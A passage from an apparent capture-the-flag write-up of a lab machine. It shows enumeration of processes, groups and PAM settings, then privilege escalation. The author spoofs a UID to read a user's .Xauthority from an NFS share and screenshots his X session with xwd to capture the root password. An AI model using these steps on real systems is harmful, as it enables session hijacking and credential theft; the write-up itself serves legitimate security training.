root        1017  0.0  1.4  33504 29040 ?        Ss   09:15   0:00 /usr/sbin/rpc.mountd --manage-gids
root        1025  0.0  0.0      0     0 ?        I<   09:15   0:00 [kworker/u5:1-xprtiod]
root        1030  0.0  0.0      0     0 ?        S    09:15   0:00 [lockd]
root        1032  0.7  3.4 253708 69760 tty7     Ssl+ 09:15   0:01 /usr/lib/xorg/Xorg -core :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
root        1057  0.0  0.3  12176  6864 ?        Ss   09:15   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root        1062  0.0  0.8 193444 17836 ?        Ss   09:15   0:00 /usr/sbin/apache2 -k start
root        1114  0.0  0.0      0     0 ?        S    09:15   0:00 [nfsd]
root        1115  0.0  0.0      0     0 ?        S    09:15   0:00 [nfsd]
root        1116  0.0  0.0      0     0 ?        S    09:15   0:00 [nfsd]
root        1117  0.0  0.0      0     0 ?        S    09:15   0:00 [nfsd]
root        1118  0.0  0.0      0     0 ?        S    09:15   0:00 [nfsd]
root        1119  0.0  0.0      0     0 ?        S    09:15   0:00 [nfsd]
root        1120  0.0  0.0      0     0 ?        S    09:15   0:00 [nfsd]
root        1121  0.0  0.0      0     0 ?        S    09:15   0:00 [nfsd]
root        1241  0.0  0.4 241196  8940 ?        Ssl  09:15   0:00 /usr/lib/upower/upowerd
root        1261  0.0  0.3 159880  7396 ?        Sl   09:15   0:00 lightdm --session-child 12 21
root        1530  0.0  0.8 282496 16264 ?        Ssl  09:15   0:00 /usr/lib/packagekit/packagekitd
alex        1876  0.0  0.0   6500   656 pts/0    S+   09:18   0:00 grep root
```

Let's look at the logged users:
```
$ ps aux | cut -d' ' -f1 | sort | uniq
ps aux | cut -d' ' -f1 | sort | uniq
USER
_rpc
alex
avahi
colord
daemon
lp
message+
root
ross
rtkit
syslog
systemd+
```
We can see that the user `ross` is logged. We saw his home earlier when we mount the NFS drives. Let's look at the running processes for this user:
```
$ ps aux | grep ross
ps aux | grep ross
ross        1269  0.0  0.5  19580 10176 ?        Ss   09:15   0:00 /lib/systemd/systemd --user
ross        1270  0.0  0.1 104144  3620 ?        S    09:15   0:00 (sd-pam)
ross        1275  0.0  0.7 804680 15156 ?        S<sl 09:15   0:00 /usr/bin/pulseaudio --daemonize=no --log-target=journal
ross        1276  0.0  0.7 187992 15596 ?        Ssl  09:15   0:00 /usr/libexec/gnome-session-binary --systemd --session=gnome
ross        1286  0.0  0.2   7856  4920 ?        Ss   09:15   0:00 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
ross        1336  0.0  0.0   6032   456 ?        Ss   09:15   0:00 /usr/bin/ssh-agent /usr/bin/im-launch /usr/bin/gnome-session --session=gnome
ross        1354  0.0  0.3 237188  7656 ?        Ssl  09:15   0:00 /usr/libexec/gvfsd
ross        1361  0.0  0.4 309704  9484 ?        Ssl  09:15   0:00 /usr/libexec/at-spi-bus-launcher
ross        1366  0.0  0.2   7240  4260 ?        S    09:15   0:00 /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3
ross        1381  0.0  0.2  87456  4344 ?        Ssl  09:15   0:00 /usr/libexec/gnome-session-ctl --monitor
ross        1390  0.0  0.8 409880 16948 ?        Ssl  09:15   0:00 /usr/libexec/gnome-session-binary --systemd-service --session=gnome
ross        1401  0.0  0.3 237420  7084 ?        Sl   09:15   0:00 /usr/bin/gnome-keyring-daemon --start --components=secrets
ross        1410  0.6  9.6 3782604 195472 ?      Ssl  09:15   0:03 /usr/bin/gnome-shell
ross        1434  0.0  0.5 312100 10224 ?        Sl   09:15   0:00 ibus-daemon --panel disable --xim
ross        1438  0.0  0.4 163820  8424 ?        Sl   09:15   0:00 /usr/libexec/ibus-memconf
ross        1439  0.1  1.3 269052 27960 ?        Sl   09:15   0:01 /usr/libexec/ibus-extension-gtk3
ross        1441  0.0  1.1 191204 24228 ?        Sl   09:15   0:00 /usr/libexec/ibus-x11 --kill-daemon
ross        1445  0.0  0.4 237620  8632 ?        Sl   09:15   0:00 /usr/libexec/ibus-portal
ross        1455  0.0  0.3 162904  6560 ?        Sl   09:15   0:00 /usr/libexec/at-spi2-registryd --use-gnome-session
ross        1460  0.0  0.9 581464 18876 ?        Sl   09:15   0:00 /usr/libexec/gnome-shell-calendar-server
ross        1468  0.0  1.2 387768 25924 ?        Ssl  09:15   0:00 /usr/libexec/evolution-source-registry
ross        1475  0.0  1.7 546964 34580 ?        Sl   09:15   0:00 /usr/libexec/goa-daemon
ross        1482  0.0  1.5 852544 30744 ?        Ssl  09:15   0:00 /usr/libexec/evolution-calendar-factory
ross        1483  0.0  0.5 314648 11552 ?        Ssl  09:15   0:00 /usr/libexec/gvfs-udisks2-volume-monitor
ross        1490  0.0  0.3 314120  7696 ?        Ssl  09:15   0:00 /usr/libexec/gvfs-afc-volume-monitor
ross        1495  0.0  0.3 233272  6164 ?        Ssl  09:15   0:00 /usr/libexec/gvfs-goa-volume-monitor
ross        1504  0.0  0.5 316060 11312 ?        Sl   09:15   0:00 /usr/libexec/goa-identity-service
ross        1508  0.0  0.2 233064  5636 ?        Ssl  09:15   0:00 /usr/libexec/gvfs-mtp-volume-monitor
ross        1512  0.0  0.3 235340  6476 ?        Ssl  09:15   0:00 /usr/libexec/gvfs-gphoto2-volume-monitor
ross        1525  0.0  0.2 156096  5376 ?        Sl   09:15   0:00 /usr/libexec/dconf-service
ross        1531  0.0  1.4 670680 29212 ?        Ssl  09:15   0:00 /usr/libexec/evolution-addressbook-factory
ross        1537  0.0  1.3 2596144 26652 ?       Sl   09:15   0:00 /usr/bin/gjs /usr/share/gnome-shell/org.gnome.Shell.Notifications
ross        1540  0.0  0.4 311260  9064 ?        Ssl  09:15   0:00 /usr/libexec/gsd-a11y-settings
ross        1541  0.0  1.2 626580 25052 ?        Ssl  09:15   0:00 /usr/libexec/gsd-color
ross        1542  0.0  0.8 371704 17136 ?        Ssl  09:15   0:00 /usr/libexec/gsd-datetime
ross        1543  0.0  0.4 311496  9212 ?        Ssl  09:15   0:00 /usr/libexec/gsd-housekeeping
ross        1544  0.0  1.2 412844 25080 ?        Ssl  09:15   0:00 /usr/libexec/gsd-keyboard
ross        1545  0.0  1.3 894276 27148 ?        Ssl  09:15   0:00 /usr/libexec/gsd-media-keys
ross        1549  0.0  1.2 339516 25280 ?        Ssl  09:15   0:00 /usr/libexec/gsd-power
ross        1551  0.0  0.5 245492 11292 ?        Ssl  09:15   0:00 /usr/libexec/gsd-print-notifications
ross        1555  0.0  0.3 454496  6096 ?        Ssl  09:15   0:00 /usr/libexec/gsd-rfkill
ross        1558  0.0  2.5 633196 51684 ?        Sl   09:15   0:00 /usr/libexec/evolution-data-server/evolution-alarm-notify
ross        1559  0.0  0.2 232904  5960 ?        Ssl  09:15   0:00 /usr/libexec/gsd-screensaver-proxy
ross        1569  0.0  0.6 466248 12464 ?        Ssl  09:15   0:00 /usr/libexec/gsd-sharing
ross        1575  0.0  0.5 315420 10312 ?        Ssl  09:15   0:00 /usr/libexec/gsd-smartcard
ross        1578  0.0  0.5 319124 10796 ?        Ssl  09:15   0:00 /usr/libexec/gsd-sound
ross        1579  0.0  0.4 385220  9148 ?        Ssl  09:15   0:00 /usr/libexec/gsd-usb-protection
ross        1580  0.0  0.1   6892  3332 ?        S    09:15   0:00 /bin/bash /usr/share/keepassxc/scripts/ross/keepassxc-start
ross        1583  0.0  1.1 338696 24176 ?        Ssl  09:15   0:00 /usr/libexec/gsd-wacom
ross        1589  0.0  0.5 315692 10456 ?        Ssl  09:15   0:00 /usr/libexec/gsd-wwan
ross        1596  0.0  1.2 338944 24872 ?        Ssl  09:15   0:00 /usr/libexec/gsd-xsettings
ross        1599  0.3  4.9 777076 101468 ?       SLl  09:15   0:01 /usr/bin/keepassxc --pw-stdin --keyfile /usr/share/keepassxc/keyfiles/ross/keyfile.key /usr/share/keepassxc/databases/ross/Passwords.kdbx
ross        1613  0.0  0.7 339576 15168 ?        Sl   09:15   0:00 /usr/libexec/gsd-printer
ross        1629  0.0  0.4 163944  8452 ?        Sl   09:15   0:00 /usr/libexec/ibus-engine-simple
ross        1848  0.0  0.3 159576  6184 ?        Ssl  09:16   0:00 /usr/libexec/gvfsd-metadata
alex        1966  0.0  0.0   6500   720 pts/0    S+   09:24   0:00 grep ross
```
The user `ross` is currently logged with a GNOME session and is running a KeePass process. Unfortunately, we are not able to read the keyfile:
```
$ ls -l /usr/share/keepassxc/keyfiles/ross/keyfile.key
ls -l /usr/share/keepassxc/keyfiles/ross/keyfile.key
ls: cannot access '/usr/share/keepassxc/keyfiles/ross/keyfile.key': Permission denied
```

Let's look at the files in his home directory:
```
$ ls -lRa /home/ross
ls -lRa /home/ross
/home/ross:
total 68
drwxr-xr-x 14 ross ross 4096 Feb 25 09:15 .
drwxr-xr-x  4 root root 4096 Oct 21  2022 ..
-rw-------  1 ross ross   57 Feb 25 09:15 .Xauthority
lrwxrwxrwx  1 root root    9 Oct 20  2022 .bash_history -> /dev/null
drwx------ 11 ross ross 4096 Oct 21  2022 .cache
drwx------ 12 ross ross 4096 Oct 21  2022 .config
drwx------  3 ross ross 4096 Oct 21  2022 .gnupg
drwx------  3 ross ross 4096 Oct 21  2022 .local
lrwxrwxrwx  1 root root    9 Oct 21  2022 .viminfo -> /dev/null
-rw-------  1 ross ross 2475 Feb 25 09:15 .xsession-errors
-rw-------  1 ross ross 2475 Dec 27  2022 .xsession-errors.old
drwxr-xr-x  2 ross ross 4096 Oct 21  2022 Desktop
drwxr-xr-x  2 ross ross 4096 Oct 21  2022 Documents
drwxr-xr-x  2 ross ross 4096 Oct 21  2022 Downloads
drwxr-xr-x  2 ross ross 4096 Oct 21  2022 Music
drwxr-xr-x  2 ross ross 4096 Oct 21  2022 Pictures
drwxr-xr-x  2 ross ross 4096 Oct 21  2022 Public
drwxr-xr-x  2 ross ross 4096 Oct 21  2022 Templates
drwxr-xr-x  2 ross ross 4096 Oct 21  2022 Videos
ls: cannot open directory '/home/ross/.cache': Permission denied
ls: cannot open directory '/home/ross/.config': Permission denied
ls: cannot open directory '/home/ross/.gnupg': Permission denied
ls: cannot open directory '/home/ross/.local': Permission denied

/home/ross/Desktop:
total 8
drwxr-xr-x  2 ross ross 4096 Oct 21  2022 .
drwxr-xr-x 14 ross ross 4096 Feb 25 09:15 ..

/home/ross/Documents:
total 12
drwxr-xr-x  2 ross ross 4096 Oct 21  2022 .
drwxr-xr-x 14 ross ross 4096 Feb 25 09:15 ..
-rw-rw-r--  1 ross ross 1365 Oct 19  2022 Passwords.kdbx

/home/ross/Downloads:
total 8
drwxr-xr-x  2 ross ross 4096 Oct 21  2022 .
drwxr-xr-x 14 ross ross 4096 Feb 25 09:15 ..

/home/ross/Music:
total 8
drwxr-xr-x  2 ross ross 4096 Oct 21  2022 .
drwxr-xr-x 14 ross ross 4096 Feb 25 09:15 ..

/home/ross/Pictures:
total 8
drwxr-xr-x  2 ross ross 4096 Oct 21  2022 .
drwxr-xr-x 14 ross ross 4096 Feb 25 09:15 ..

/home/ross/Public:
total 8
drwxr-xr-x  2 ross ross 4096 Oct 21  2022 .
drwxr-xr-x 14 ross ross 4096 Feb 25 09:15 ..

/home/ross/Templates:
total 8
drwxr-xr-x  2 ross ross 4096 Oct 21  2022 .
drwxr-xr-x 14 ross ross 4096 Feb 25 09:15 ..

/home/ross/Videos:
total 8
drwxr-xr-x  2 ross ross 4096 Oct 21  2022 .
drwxr-xr-x 14 ross ross 4096 Feb 25 09:15 ..
```
We have read access to the KeePass database.

Let's now look at the current user privileges:
```
$ sudo -l
sudo -l
[sudo] password for alex: 

Sorry, try again.
```
It seems we do not have the permissions to see the sudo permissions.

Let's now look at the groups on the machine:
```
$ cat /etc/group
cat /etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog
tty:x:5:syslog
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:
floppy:x:25:
tape:x:26:
sudo:x:27:
audio:x:29:pulse
dip:x:30:
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-network:x:102:
systemd-resolve:x:103:
systemd-timesync:x:104:
crontab:x:105:
messagebus:x:106:
input:x:107:
kvm:x:108:
render:x:109:
syslog:x:110:
tss:x:111:
uuidd:x:112:
tcpdump:x:113:
ssh:x:114:
landscape:x:115:
lxd:x:116:
systemd-coredump:x:999:
netdev:x:117:
alex:x:2017:
ross:x:1001:
bluetooth:x:118:
rtkit:x:119:
avahi:x:120:
lpadmin:x:121:
pulse:x:122:
pulse-access:x:123:
geoclue:x:124:
scanner:x:125:saned
saned:x:126:
colord:x:127:
ssl-cert:x:129:
lightdm:x:128:
nopasswdlogin:x:130:ross
fwupd-refresh:x:131:
```
We can see that the user `ross` is member of the group `nopasswdlogin`. We can see that members in this group can log with `lightdm` without a password:
```
$ cat /etc/pam.d/lightdm
cat /etc/pam.d/lightdm
#%PAM-1.0
auth    requisite       pam_nologin.so
auth    sufficient      pam_succeed_if.so user ingroup nopasswdlogin
@include common-auth
-auth    optional        pam_gnome_keyring.so
-auth    optional        pam_kwallet.so
-auth    optional        pam_kwallet5.so
@include common-account
session [success=ok ignore=ignore module_unknown=ignore default=bad] pam_selinux.so close
#session required        pam_loginuid.so
session required        pam_limits.so
@include common-session
session [success=ok ignore=ignore module_unknown=ignore default=bad] pam_selinux.so open
-session optional        pam_gnome_keyring.so auto_start
-session optional        pam_kwallet.so auto_start
-session optional        pam_kwallet5.so auto_start
session required        pam_env.so readenv=1
session required        pam_env.so readenv=1 user_readenv=1 envfile=/etc/default/locale
@include common-password
```

I finally found a shell file owned by `root` but modifiable by `alex`:
```
$ ls -l /var/images/pull_images.sh
ls -l /var/images/pull_images.sh
-rwxrwxr-x 1 root alex 138 Oct 17  2022 /var/images/pull_images.sh

$ cat /var/images/pull_images.sh
cat /var/images/pull_images.sh
#!/bin/bash
cp /var/images/*.jpg /var/www/Cthulhu/home/static/home/images/
cp /var/images/*.png /var/www/Cthulhu/home/static/home/images/
```
This script copied images from `/var/images` to `/var/www/Cthulhu/home/static/home/images/`. However, this folder does not exist (or is not visible by the current user):
```
$ ls -la /var/www/Cthulhu
ls -la /var/www/Cthulhu
ls: cannot access '/var/www/Cthulhu': No such file or directory
```
Also, I have found no place where this script could be run:
```
$ grep -r pull_images.sh 2> /dev/null 
grep -r pull_images.sh 2> /dev/null
Binary file proc/33862/task/33862/cmdline matches
Binary file proc/33862/cmdline matches
```
I added the following lines at the end of the script to check if the script would be manually run:
```
touch /tmp/touched
chmod 777 /tmp/touched
```
For the moment, the file `/tmp/touched` has never been created.
### Exploitation
Grouping all this information together, we know that `ross` user has an open X display with KeePass running on it. We have access to the `.Xautority` file of `ross` using the NFS server. With this, we can make a screenshot of the current X session display to see if we could get interesting information.

First, let's get the `.Xautority` file from the NFS server:
```
$sudo useradd user1001 -u 1001 -g 1001 -m -s /bin/bash
$sudo mount -t nfs 10.129.2.154:/home/ross /mnt/nfs
$sudo su user1001
$cd /mnt/nfs
$cp .Xauthority /tmp
$chmod 777 /tmp/.Xauthority
$exit
$sudo su user2017
$cp /tmp/.Xauthority /mnt/nfswww
```
The file is now available on the target machine:
```
$ cp /var/www/html/.Xauthority ~
```

To make the screenshot:
```
$ XAUTHORITY=/home/alex/.Xauthority xwd -screen -display :0 -root -silent > /var/www/html/res.xwd
```

We need to convert it on the attacker machine:
```
$convert screenshot.xwd screenshot.png
```

The screenshot shows the root password. We can now log to root user and get the flag:
```
$ su root
su root
Password: c[...]A

root@squashed:/tmp# cat /root/root.txt
cat /root/root.txt
e[...]4
```
## Learning from other writeups
### Official writeup
To get a foothold on the machine, the process is similar to mine: mount the NFS share, create a new user with a specific UID and upload a reverse shell in order to get access. One difference is in the tool used: I used nmap scripts to enumerate the NFS shares, while here, `showmount` is used. I have the feeling that both tools have the same features.
Same process also to escalate privileges, it stole the X session cookie and used it to make a screenshot with `xwd`.
## Lessons learned
I had trouble to detect that the vulnerability to escalate privileges was in the X session. Indeed, I tried different ways to login using `LightDM` but without success. This was because I totally forgot that I had access to the home folder of `ross`. It is important to remember to the data gathered during all the exploitation, and not forget them as soon as we got a foothold.